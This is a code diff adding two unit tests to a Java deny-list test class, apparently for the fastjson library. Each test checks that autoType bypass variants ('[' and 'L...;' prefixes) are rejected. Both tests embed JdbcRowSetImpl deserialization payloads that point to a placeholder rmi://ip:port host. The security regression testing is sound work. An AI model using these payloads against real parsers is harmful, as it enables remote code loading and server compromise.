@@ -24,4 +24,40 @@ public class AutoTypeTest2_deny extends TestCase {
         error.printStackTrace();
         assertTrue(error.getMessage().startsWith("autoType is not support"));
     }
+
+    public void test_1() throws Exception {
+
+        String text = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://ip:port/Object\",\"autoCommit\":true}";
+
+        Exception error = null;
+        try {
+            JSON.parse(text);
+        } catch (JSONException ex) {
+            error = ex;
+        }
+
+        error.printStackTrace();
+
+        assertNotNull(error);
+        error.printStackTrace();
+        assertTrue(error.getMessage().startsWith("autoType is not support"));
+    }
+
+    public void test_2() throws Exception {
+
+        String text = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://ip:port/Object\",\"autoCommit\":true}";
+
+        Exception error = null;
+        try {
+            JSON.parse(text);
+        } catch (JSONException ex) {
+            error = ex;
+        }
+
+        error.printStackTrace();
+
+        assertNotNull(error);
+        error.printStackTrace();
+        assertTrue(error.getMessage().startsWith("autoType is not support"));
+    }
 }
